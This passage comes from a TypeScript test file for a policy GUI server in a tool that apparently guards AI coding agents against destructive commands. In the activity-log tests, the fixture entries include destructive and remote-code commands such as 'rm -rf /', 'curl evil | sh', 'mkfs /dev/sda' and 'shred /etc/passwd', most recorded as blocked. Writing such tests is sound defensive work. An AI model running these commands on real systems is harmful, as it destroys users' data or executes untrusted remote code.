    writeDraftUserPolicy({ version: 1, safety: { level: 'bogus' } });
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const state = await getJson<ProjectDraftApiResponse>(
        `${server.origin}/api/policy/project?token=${server.token}`,
      );

      expect(state.userPolicyDiagnostics.length).toBeGreaterThan(0);
      expect(state.userPolicyDiagnostics.join('\n')).toContain('safety.level');
      expect(state.baseline.safety.level).toBe('standard');
    } finally {
      await server.close();
    }
  });

  test('project diff rows and weakenings match CLI policy check for the same proposal', async () => {
    writeDraftUserPolicy({ version: 1, safety: { level: 'paranoid' } });
    writeProjectPolicyFile(tempDir, { version: 1, safety: { level: 'strict' } });
    const proposal = {
      version: 1,
      safety: { level: 'standard' },
      secret_protection: { enabled: false },
    };
    const proposalPath = join(tempDir, 'proposal.json');
    writeFileSync(proposalPath, JSON.stringify(proposal), 'utf-8');
    const server = await createPolicyGuiServer(projectDraftOptions(tempDir));
    try {
      const diff = await postJson<ProjectDiffApiResponse>(
        `${server.origin}/api/policy/project/diff?token=${server.token}`,
        server.token,
        { revision: 0, proposal },
      );
      const cli = await withEnv({ CC_SAFETY_NET_HOME: join(tempDir, 'home') }, () =>
        captureConsoleOutput(() => runPolicyCommand(['check', proposalPath], { cwd: tempDir })),
      );

      expect(cli.result).toBe(0);
      // Same rows, same order, same rendering of an absent side: the GUI dialog
      // and `policy check` must not describe one proposal two ways.
      expect(
        diff.rows.map(
          (row) => `  ${row.field}: ${row.before ?? '(unset)'} -> ${row.after ?? '(unset)'}`,
        ),
      ).toEqual(cli.stdout.filter((line) => line.startsWith('  ')));
      expect(diff.rows.length).toBeGreaterThan(0);
      expect(diff.weakenings).toContain('project policy lowers level: paranoid -> standard');
      expect(diff.existingFileDiagnostics).toEqual([]);
    } finally {
      await server.close();
    }
  });

  test('invalid POST is rejected and leaves existing file unchanged', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(join(safetyNetHome, 'policy.json'), '{"version":1}\n', 'utf-8');
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(`${server.origin}/api/policy?token=${server.token}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-cc-safety-net-token': server.token,
        },
        body: JSON.stringify({ version: 1, extra: true }),
      });

      expect(response.status).toBe(400);
      const body = (await response.json()) as { errors: string[] };
      expect(body.errors).toContain('unknown field "extra"');
      expect(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')).toBe('{"version":1}\n');
    } finally {
      await server.close();
    }
  });

  test('malformed POST JSON and unknown routes return errors', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const malformed = await fetch(`${server.origin}/api/policy?token=${server.token}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-cc-safety-net-token': server.token,
        },
        body: '{bad json',
      });
      expect(malformed.status).toBe(400);
      const malformedBody = (await malformed.json()) as { errors: string[] };
      expect(malformedBody.errors[0]).toContain('Invalid JSON');

      const missing = await fetch(`${server.origin}/missing?token=${server.token}`);
      expect(missing.status).toBe(404);
      expect((await missing.json()) as { error: string }).toEqual({ error: 'Not found' });
    } finally {
      await server.close();
    }
  });

  test('POST api repair preserves valid settings from parseable invalid policy', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(
      join(safetyNetHome, 'policy.json'),
      JSON.stringify({
        version: 2,
        modes: { strict: true, paranoid: 'yes' },
        safety: { level: 'strict', overrides: { fail_closed: true } },
        workflow: { worktree_mode: true },
        destructive_command_protection: {
          enabled: false,
          overrides: { 'git.reset-hard': 'off', 'git.unknown': 'off' },
        },
        secret_protection: {
          enabled: 'no',
          overrides: { 'secret.ext.pem': 'off' },
          deny_paths: ['private/token.txt', 42],
        },
      }),
      'utf-8',
    );
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const repairedPolicy = await repairPolicyViaApi(safetyNetHome, server);

      expect(repairedPolicy).toMatchObject({
        version: 1,
        safety: { level: 'strict', overrides: { fail_closed: true } },
        workflow: { worktree_mode: true },
        destructive_command_protection: {
          enabled: false,
          overrides: { 'git.reset-hard': 'off' },
        },
        secret_protection: {
          enabled: true,
          overrides: { 'secret.ext.pem': 'off' },
          deny_paths: ['private/token.txt'],
        },
      });
    } finally {
      await server.close();
    }
  });

  test('POST api repair restores defaults for malformed policy JSON', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(join(safetyNetHome, 'policy.json'), '{bad json', 'utf-8');
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const repairedPolicy = await repairPolicyViaApi(safetyNetHome, server);

      expect(repairedPolicy).toMatchObject({
        version: 1,
        destructive_command_protection: { enabled: true, overrides: {} },
        secret_protection: { enabled: true, overrides: {}, deny_paths: [] },
      });
    } finally {
      await server.close();
    }
  });

  test('POST requires the header token as well as the URL token', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(`${server.origin}/api/reset?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      });

      expect(response.status).toBe(403);
      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST api star requires the header token as well as the URL token', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/star`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/star?token=wrong`)).status).toBe(403);
      expect(
        (
          await fetch(`${server.origin}/api/star?token=${server.token}`, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: '{}',
          })
        ).status,
      ).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('POST api star returns success from injected star action', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      starRepo: async () => ({ ok: true }),
    });
    try {
      expect(
        await postJson<{ ok: boolean }>(
          `${server.origin}/api/star?token=${server.token}`,
          server.token,
          {},
        ),
      ).toEqual({ ok: true });
    } finally {
      await server.close();
    }
  });

  test('POST api star returns fallback URL when injected star action fails', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      starRepo: async () => ({ ok: false }),
    });
    try {
      expect(
        await postJson<{ fallbackUrl: string; ok: boolean }>(
          `${server.origin}/api/star?token=${server.token}`,
          server.token,
          {},
        ),
      ).toEqual({
        ok: false,
        fallbackUrl: 'https://github.com/kenryu42/cc-safety-net',
      });
    } finally {
      await server.close();
    }
  });

  test('GET api star context requires URL token and returns injected context', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchStarContext: async () => ({ starred: false, starCount: 1234, blockedTotal: 14 }),
    });
    try {
      expect((await fetch(`${server.origin}/api/star/context`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/star/context?token=wrong`)).status).toBe(403);
      expect(
        await getJson<StarContextApiResponse>(
          `${server.origin}/api/star/context?token=${server.token}`,
        ),
      ).toEqual({ starred: false, starCount: 1234, blockedTotal: 14 });
    } finally {
      await server.close();
    }
  });

  test('star context reads retained blocked activity and degrades failed fields independently', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    writeFileSync(
      join(logsDir, 'session.jsonl'),
      [
        JSON.stringify({
          ts: new Date().toISOString(),
          decision: 'block',
          command: 'rm -rf .',
          reason: 'destructive',
        }),
        JSON.stringify({
          ts: new Date().toISOString(),
          decision: 'allow',
          command: 'git status',
          reason: 'safe',
        }),
        JSON.stringify({
          ts: new Date(Date.now() - 8 * 24 * 60 * 60 * 1000).toISOString(),
          decision: 'block',
          command: 'git reset --hard',
          reason: 'destructive',
        }),
        // Physically retained but expired: opportunistic pruning keeps a legacy
        // file whose modification time is fresh, so the count must exclude it.
        JSON.stringify({
          ts: new Date(Date.now() - 100 * 24 * 60 * 60 * 1000).toISOString(),
          decision: 'block',
          command: 'git clean -fdx',
          reason: 'destructive',
        }),
      ].join('\n'),
      'utf-8',
    );

    expect(
      await fetchStarContext({
        command: join(tempDir, 'missing-gh'),
        logsDir,
        fetchRepo: async () => {
          throw new Error('offline');
        },
      }),
    ).toEqual({ starred: null, starCount: null, blockedTotal: 2 });
  });

  test('GET /api/activity rejects missing token, wrong token, and invalid days', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/activity`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/activity?token=wrong`)).status).toBe(403);
      const bad = await fetch(`${server.origin}/api/activity?days=abc&token=${server.token}`);
      expect(bad.status).toBe(400);
      expect(await bad.json()).toEqual({ error: 'days must be an integer between 1 and 30' });
      const zero = await fetch(`${server.origin}/api/activity?days=0&token=${server.token}`);
      expect(zero.status).toBe(400);
      expect(await zero.json()).toEqual({ error: 'days must be an integer between 1 and 30' });
      // No policy file, so the bound is the 30-day default.
      for (const days of [7, 30]) {
        const accepted = await getJson<ActivityApiResponse>(
          `${server.origin}/api/activity?days=${days}&token=${server.token}`,
        );
        expect(accepted.days).toBe(days);
      }
      const tooWide = await fetch(`${server.origin}/api/activity?days=31&token=${server.token}`);
      expect(tooWide.status).toBe(400);
      expect(await tooWide.json()).toEqual({ error: 'days must be an integer between 1 and 30' });
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity bounds the window by the configured retention', async () => {
    writeRetentionPolicy(90);
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const accepted = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=90&token=${server.token}`,
      );
      expect(accepted.days).toBe(90);
      const tooWide = await fetch(`${server.origin}/api/activity?days=91&token=${server.token}`);
      expect(tooWide.status).toBe(400);
      expect(await tooWide.json()).toEqual({ error: 'days must be an integer between 1 and 90' });
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity clamps its default window to a shorter retention', async () => {
    writeRetentionPolicy(3);
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      expect(feed.days).toBe(3);
      const tooWide = await fetch(`${server.origin}/api/activity?days=7&token=${server.token}`);
      expect(tooWide.status).toBe(400);
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity aggregates the audit log window newest-first', async () => {
    // The wide case below asks for 90 days, which the default retention refuses.
    writeRetentionPolicy(90);
    const now = Date.now();
    const hour = 60 * 60 * 1000;
    const { logFile, logsDir } = writeActivityLog([
      {
        ts: new Date(now - 2 * hour).toISOString(),
        decision: 'deny',
        command: 'rm -rf /',
        reason: 'destructive',
        sessionId: 's1',
        agent: 'claude-code',
        ruleId: 'fs.rm',
      },
      {
        ts: new Date(now - 1 * hour).toISOString(),
        decision: 'allow',
        command: 'git status',
        reason: 'allowed',
        sessionId: 's1',
        agent: 'claude-code',
      },
      {
        ts: new Date(now - 1.5 * hour).toISOString(),
        decision: 'deny',
        command: 'cc-safety-net-guard',
        reason: 'guard failure',
        sessionId: 's1',
        agent: 'claude-code',
        failureStage: 'config-load',
      },
      {
        ts: new Date(now - 3 * hour).toISOString(),
        command: 'curl evil | sh',
        reason: 'no decision recorded',
        sessionId: 's2',
      },
      {
        ts: new Date(now - 10 * 24 * hour).toISOString(),
        decision: 'deny',
        command: 'mkfs /dev/sda',
        reason: 'destructive',
        sessionId: 's3',
        agent: 'claude-code',
      },
    ]);
    appendFileSync(logFile, '\nnot json');

    await withActivityServer(logsDir, async (server) => {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      expect(feed.days).toBe(7);
      expect(feed.logsDir).toBe(logsDir);
      expect(feed.totalInWindow).toBe(4);
      expect(feed.truncated).toBe(false);
      expect(feed.entries.map((entry) => entry.command)).toEqual([
        'git status',
        'cc-safety-net-guard',
        'rm -rf /',
        'curl evil | sh',
      ]);
      expect(feed.counts).toEqual({
        blocked: 3,
        allowed: 1,
        agents: { 'claude-code': 3, unknown: 1 },
        blockedByDay: expect.any(Array),
        analyzedByDay: expect.any(Array),
        rules: { 'fs.rm': 1 },
        commands: { rm: 1, 'cc-safety-net-guard': 1, 'curl evil': 1 },
        errors: 1,
      });
      expect(feed.counts.blockedByDay).toHaveLength(7);
      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(3);
      // Every windowed entry lands in a bucket, blocked or not.
      expect(feed.counts.analyzedByDay).toHaveLength(7);
      expect(feed.counts.analyzedByDay.reduce((total, count) => total + count, 0)).toBe(4);

      const wide = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=90&token=${server.token}`,
      );
      expect(wide.days).toBe(90);
      expect(wide.totalInWindow).toBe(5);
      expect(wide.entries[4]?.command).toBe('mkfs /dev/sda');
      expect(wide.counts.blocked).toBe(4);
      expect(wide.counts.blockedByDay).toHaveLength(90);
      expect(wide.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(4);
      expect(wide.counts.analyzedByDay).toHaveLength(90);
      expect(wide.counts.analyzedByDay.reduce((total, count) => total + count, 0)).toBe(5);
    });
  });

  test('GET /api/activity excludes entries older than the window still present on disk', async () => {
    writeRetentionPolicy(90);
    const now = Date.now();
    const day = 24 * 60 * 60 * 1000;
    // A legacy root-level file with a fresh modification time is never
    // automatically pruned, so its expired entry stays physically on disk.
    const { logFile, logsDir } = writeActivityLog(
      [
        { ts: new Date(now - 1000).toISOString(), decision: 'deny', command: 'rm -rf /' },
        { ts: new Date(now - 1000).toISOString(), decision: 'allow', command: 'git status' },
        {
          ts: new Date(now - 88 * day).toISOString(),
          decision: 'deny',
          command: 'shred /etc/passwd',
        },
        {
          ts: new Date(now - 100 * day).toISOString(),
          decision: 'deny',
          command: 'chmod -R 000 /',
        },
      ],
      'retained.jsonl',
    );

    await withActivityServer(logsDir, async (server) => {
      const narrow = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=7&token=${server.token}`,
      );
      expect(narrow.counts.blocked).toBe(1);

      const wide = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=90&token=${server.token}`,
      );
      // The 88-day entry joins the window; the 100-day one stays out of it even
      // though the file holding both is still on disk.
      expect(wide.counts.blocked).toBe(2);
      expect(existsSync(logFile)).toBe(true);
    });
  });

  test('GET /api/activity counts blocks beyond the 500-entry cap', async () => {
    const now = Date.now();
    const minute = 60 * 1000;
    const { logsDir } = writeActivityLog([
      {
        ts: new Date(now - 501 * minute).toISOString(),
        decision: 'deny',
        command: 'rm -rf /',
        reason: 'destructive',
      },
      ...Array.from({ length: 501 }, (_, index) => ({
        ts: new Date(now - index * minute).toISOString(),
        decision: 'allow',
        command: `git status ${index}`,
        reason: 'allowed',
      })),
    ]);

    await withActivityServer(logsDir, async (server) => {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      expect(feed.truncated).toBe(true);
      expect(feed.totalInWindow).toBe(502);
      expect(feed.entries).toHaveLength(500);
      expect(feed.counts.blocked).toBe(1);
      expect(feed.counts.allowed).toBe(501);
      expect(feed.counts.commands).toEqual({ rm: 1 });
      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(1);
      // The deny is the oldest entry in the window, but allowed entries must not
      // crowd it out of the capped feed: the Blocked filter reads this list.
      expect(feed.entries.filter((entry) => entry.decision === 'deny')).toHaveLength(1);
      expect(feed.entries.at(-1)?.command).toBe('rm -rf /');
      expect(
        feed.entries.slice(0, -1).every((entry) => entry.command.startsWith('git status')),
      ).toBe(true);
    });
  });

  test('GET /api/activity buckets the per-day series by local calendar day', async () => {
    const noon = new Date();
    const at = (daysAgo: number) =>
      new Date(noon.getFullYear(), noon.getMonth(), noon.getDate() - daysAgo, 12).toISOString();
    const { logsDir } = writeActivityLog([
      {
        ts: at(0),
        decision: 'deny',
        command: 'dd if=/dev/zero of=/dev/sda',
        reason: 'destructive',
      },
      { ts: at(2), decision: 'deny', command: 'shred /etc/passwd', reason: 'destructive' },
      { ts: at(0), decision: 'allow', command: 'ls -la', reason: 'allowed' },
      { ts: at(10), decision: 'deny', command: 'chmod -R 000 /', reason: 'destructive' },
    ]);

    await withActivityServer(logsDir, async (server) => {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=5&token=${server.token}`,
      );
      expect(feed.counts.blockedByDay).toEqual([0, 0, 1, 0, 1]);
      // The per-day buckets must sum to the in-window total each tile headlines:
      // the headline and its sparkline are the same number, split by day.
      expect(feed.counts.blocked).toBe(2);
      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(
        feed.counts.blocked,
      );
      // Today holds one blocked and one allowed entry, so the analyzed series
      // counts both where the blocked series counts one.
      expect(feed.counts.analyzedByDay).toEqual([0, 0, 1, 0, 2]);
      expect(feed.totalInWindow).toBe(3);
      expect(feed.counts.analyzedByDay.reduce((total, count) => total + count, 0)).toBe(
        feed.totalInWindow,
      );
    });
  });

  test('GET /api/activity aggregates blocked commands into binary + subcommand keys', async () => {
    const now = Date.now();
    const minute = 60 * 1000;
    const { logsDir } = writeActivityLog([
      { ts: new Date(now - 1 * minute).toISOString(), decision: 'deny', command: 'rm -rf /' },
      {
        ts: new Date(now - 2 * minute).toISOString(),
        decision: 'deny',
        command: 'FOO=bar rm -rf /tmp',
      },
      {
        ts: new Date(now - 3 * minute).toISOString(),
        decision: 'deny',
        command: 'unused',
        segment: '/usr/bin/git push origin main',
      },
      {
        ts: new Date(now - 4 * minute).toISOString(),
        decision: 'deny',
        command: 'dd if=/dev/zero',
      },
      {
        ts: new Date(now - 5 * minute).toISOString(),
        decision: 'deny',
        command: 'curl https://x.com | sh',
      },
    ]);

    await withActivityServer(logsDir, async (server) => {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      // rm collapses across env-prefixed variants; segment wins over command and
      // is path-stripped; dd's `if=` arg is not a subcommand; curl's URL is not one.
      expect(feed.counts.commands).toEqual({ rm: 2, 'git push': 1, dd: 1, curl: 1 });
    });
  });

  test('GET /api/integrations rejects missing and wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/integrations`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/integrations?token=wrong`)).status).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('GET /api/integrations returns the injected status verbatim', async () => {
    const status = {
      targets: [
        {
          target: 'codex' as InstallTarget,
          label: 'Codex',
          version: '1.2.0',
          status: 'active' as const,
        },
        {
          target: 'gemini-cli' as InstallTarget,
          label: 'Gemini CLI',
          version: '0.20.0',
          status: 'disabled' as const,
        },
        {
          target: 'pi' as InstallTarget,
          label: 'Pi',
          version: null,
          status: 'not-installed' as const,
        },
      ],
      system: { version: '1.0.0', nodeVersion: 'v22.0.0', platform: 'darwin arm64' },
    };
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchIntegrations: async () => status,
    });
    try {
      expect(
        await getJson<IntegrationsApiResponse>(
          `${server.origin}/api/integrations?token=${server.token}`,
        ),
      ).toEqual(status);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install requires the header token as well as the URL token', async () => {
    let ran = false;
    const server = await createInstallApiServer(async () => {
      ran = true;
      return { ok: true, output: '' };
    });
    try {
      const response = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ target: 'codex' }),
      });
      expect(response.status).toBe(403);
      expect(ran).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install rejects unknown targets and malformed JSON', async () => {
    let ran = false;
    const server = await createInstallApiServer(async () => {
      ran = true;
      return { ok: true, output: '' };
    });
    try {
      const unknown = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: JSON.stringify({ target: 'not-a-real-agent' }),
      });
      expect(unknown.status).toBe(400);
      expect(await unknown.json()).toEqual({ error: 'unknown target' });

      const malformed = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: '{bad json',
      });
      expect(malformed.status).toBe(400);
      expect(((await malformed.json()) as { errors: string[] }).errors[0]).toContain(
        'Invalid JSON',
      );
      expect(ran).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install runs the codex target and returns its post-install message', async () => {
    const calls: [InstallAction, InstallTarget][] = [];
    const output =
      'Installed Codex integration\nStart Codex, open /hooks, select the cc-safety-net PreToolUse hook, and press t to trust it.';
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async (action, target) => {
        calls.push([action, target]);
        return { ok: true, output };
      },
    });
    try {
      const result = await postJson<IntegrationActionApiResponse>(
        `${server.origin}/api/install?token=${server.token}`,
        server.token,
        { target: 'codex' },
      );
      expect(calls).toEqual([['install', 'codex']]);
      expect(result).toEqual({ ok: true, output });
    } finally {
      await server.close();
    }
  });

  test('POST /api/uninstall maps to the uninstall action and returns the failure output', async () => {
    const calls: [InstallAction, InstallTarget][] = [];
    const output =
      'Failed to run claude plugin uninstall cc-safety-net (exit 1).\ndistinctive-stderr-text';
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async (action, target) => {
        calls.push([action, target]);
        return { ok: false, output };
      },
    });
    try {
      const result = await postJson<IntegrationActionApiResponse>(
        `${server.origin}/api/uninstall?token=${server.token}`,
        server.token,
        { target: 'claude-code' },
      );
      expect(calls).toEqual([['uninstall', 'claude-code']]);
      expect(result).toEqual({ ok: false, output });
    } finally {
      await server.close();
    }
  });

  test('fetchIntegrations maps CLI versions and hook status without spawning', async () => {
    const homeDir = join(tempDir, 'home');
    mkdirSync(join(homeDir, '.kimi-code'), { recursive: true });
    writeFileSync(
      join(homeDir, '.kimi-code', 'config.toml'),
      'command = "cc-safety-net hook --kimi-code"\n',
      'utf-8',
    );

    const originalKimiHome = process.env.KIMI_CODE_HOME;
    delete process.env.KIMI_CODE_HOME;
    try {
      const status = await fetchIntegrations({ fetcher: mockVersionFetcher, homeDir });

      expect(status.targets.map((target) => target.target)).toEqual([
        'amp',
        'antigravity-cli',
        'claude-code',
        'codex',
        'cursor',
        'gemini-cli',
        'copilot-cli',
        'grok-build',
        'hermes-agent',
        'kimi-code',
        'openclaw',
        'opencode',
        'pi',
      ]);
      const versions = Object.fromEntries(
        status.targets.map((target) => [target.target, target.version]),
      );
      expect(versions).toEqual({
        'antigravity-cli': '2.0.0',
        'claude-code': '1.0.0',
        codex: '1.2.0',
        'gemini-cli': '0.20.0',
        'copilot-cli': '1.0.9',
        'grok-build': '1.1.0',
        'kimi-code': '0.3.0',
        opencode: '0.1.0',
        pi: '0.4.0',
        cursor: null,
        amp: null,
        'hermes-agent': '1.5.0',
        openclaw: '2026.8.1',
      });
      const statuses = Object.fromEntries(
        status.targets.map((target) => [target.target, target.status]),
      );
      expect(statuses['kimi-code']).toBe('active');
      expect(statuses.opencode).toBe('not-installed');
      expect(statuses.pi).toBe('not-installed');
      // The system block carries only version/node/platform — npm and bun are excluded.
      expect(Object.keys(status.system).sort()).toEqual(['nodeVersion', 'platform', 'version']);
    } finally {
      if (originalKimiHome === undefined) delete process.env.KIMI_CODE_HOME;
      else process.env.KIMI_CODE_HOME = originalKimiHome;
    }
  });

  test('fetchIntegrations reads plugin state from disk instead of spawning the runtime', async () => {
    const homeDir = join(tempDir, 'integrations-home');
    writeClaudePluginState(homeDir, true);
    mkdirSync(join(homeDir, '.copilot', 'installed-plugins', 'cc-marketplace', 'cc-safety-net'), {
      recursive: true,
    });

    const status = await fetchIntegrations({ fetcher: mockVersionFetcher, homeDir });

    const statuses = Object.fromEntries(
      status.targets.map((target) => [target.target, target.status]),
    );
    expect(statuses['claude-code']).toBe('active');
    expect(statuses['copilot-cli']).toBe('active');
    expect(statuses['gemini-cli']).toBe('not-installed');
  });

  test('GET /api/health rejects missing and wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/health`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/health?token=wrong`)).status).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('GET /api/health returns the injected status verbatim', async () => {
    const status = {
      hooks: [
        { platform: 'claude-code', label: 'Claude Code', configured: true },
        { platform: 'codex', label: 'Codex', configured: false },
      ],
      update: { currentVersion: '1.0.0', latestVersion: '2.0.0', updateAvailable: true },
    };
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchHealth: async () => status,
    });
    try {
      expect(
        await getJson<typeof status>(`${server.origin}/api/health?token=${server.token}`),
      ).toEqual(status);
    } finally {
      await server.close();
    }
  });

  test('fetchHealth reports only the hooks it can inspect without mutating them', async () => {
    const status = await fetchHealth({
      fetcher: mockVersionFetcher,
      homeDir: join(tempDir, 'home'),
      checkUpdates: async () => ({
        currentVersion: '1.0.0',
        latestVersion: '2.0.0',
        updateAvailable: true,
      }),
    });

    const platforms = status.hooks.map((hook) => hook.platform);
    expect(platforms).toContain('codex');
    // Claude Code, Gemini CLI, Copilot CLI and Pi are inspectable only through probes that
    // write into the user's config directories, so they are never reported from here.
    expect(platforms).not.toContain('claude-code');
    expect(platforms).not.toContain('gemini-cli');
    expect(platforms).not.toContain('pi');
    expect(
      Object.fromEntries(status.hooks.map((hook) => [hook.platform, hook.configured])).codex,
    ).toBe(true);
    expect(status.update).toEqual({
      currentVersion: '1.0.0',
      latestVersion: '2.0.0',
      updateAvailable: true,
    });
  });

  test('runIntegration captures console output and restores the console afterward', async () => {
    const originalLog = console.log;
    const result = await runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        console.log('marker-line');
        return [];
      },
    });

    // An empty selection installs nothing, which is the same ordinary outcome as quitting
    // the selector; the console must still be captured and restored.
    expect(result.ok).toBe(true);
    expect(result.output).toContain('marker-line');
    expect(console.log).toBe(originalLog);
  });

  test('runIntegration reports failures with the captured error output', async () => {
    const result = await runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        throw new Error('distinct-failure-text');
      },
    });

    expect(result.ok).toBe(false);
    expect(result.output).toContain('distinct-failure-text');
  });

  test('runIntegration returns the install report written to the install output stream', async () => {
    const homeDir = mkdtempSync(join(tmpdir(), 'gui-install-report-'));
    // runInstallCommand writes its per-target report to `output`, never to the console, so
    // the GUI status box stays empty unless runIntegration captures that stream too.
    const result = await withEnv({ HOME: homeDir, npm_config_cache: join(homeDir, '.npm') }, () =>
      runIntegration('install', 'cursor', {
        probeTargets: () => false,
        detectConfiguredTargets: async () => [],
      }),
    );
    rmSync(homeDir, { recursive: true, force: true });

    expect(result.ok).toBe(true);
    expect(result.output).toBe(
      `Installed ${getIntegrationDisplayName('cursor')} hook in ${join(homeDir, '.cursor', 'hooks.json')}`,
    );
  });

  test('runIntegration serializes concurrent runs so captured output never mixes', async () => {
    const first = runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        await new Promise((resolve) => setTimeout(resolve, 50));
        console.log('first-marker');
        return [];
      },
    });
    const second = runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        console.log('second-marker');
        return [];
      },
    });

    const [firstResult, secondResult] = await Promise.all([first, second]);
    expect(firstResult.output).toContain('first-marker');
    expect(firstResult.output).not.toContain('second-marker');
    expect(secondResult.output).toContain('second-marker');
    expect(secondResult.output).not.toContain('first-marker');
  });

  test('userHasStarredRepo checks gh auth before starred state and maps exits', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-check-'));
    const binDir = writeFakeCommands(localTempDir, {
      gh: `appendFileSync(process.env.STAR_LOG ?? '', args.join('\\n') + '\\n');
if (args[0] === 'auth' && args[1] === 'status') {
  process.exit(Number(process.env.AUTH_EXIT));
}
process.exit(Number(process.env.STAR_EXIT));`,
    });
    const starLog = join(localTempDir, 'star-check-argv.txt');

    try {
      await withEnv(
        {
          PATH: `${binDir}${delimiter}${process.env.PATH ?? ''}`,
          STAR_LOG: starLog,
          AUTH_EXIT: '0',
          STAR_EXIT: '0',
        },
        async () => {
          expect(await userHasStarredRepo()).toBe(true);
          expect(readFileSync(starLog, 'utf-8')).toBe(
            'auth\nstatus\napi\n/user/starred/kenryu42/cc-safety-net\n',
          );

          writeFileSync(starLog, '', 'utf-8');
          process.env.STAR_EXIT = '1';
          expect(await userHasStarredRepo()).toBe(false);
          expect(readFileSync(starLog, 'utf-8')).toBe(
            'auth\nstatus\napi\n/user/starred/kenryu42/cc-safety-net\n',
          );

          writeFileSync(starLog, '', 'utf-8');
          process.env.AUTH_EXIT = '1';
          process.env.STAR_EXIT = '0';
          expect(await userHasStarredRepo()).toBeNull();
          expect(readFileSync(starLog, 'utf-8')).toBe('auth\nstatus\n');

          expect(await userHasStarredRepo(join(localTempDir, 'missing-gh'))).toBeNull();
        },
      );
    } finally {
      rmSync(localTempDir, { recursive: true, force: true });
    }
  });

  test('star helpers return fallback states on timeout', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-timeout-'));
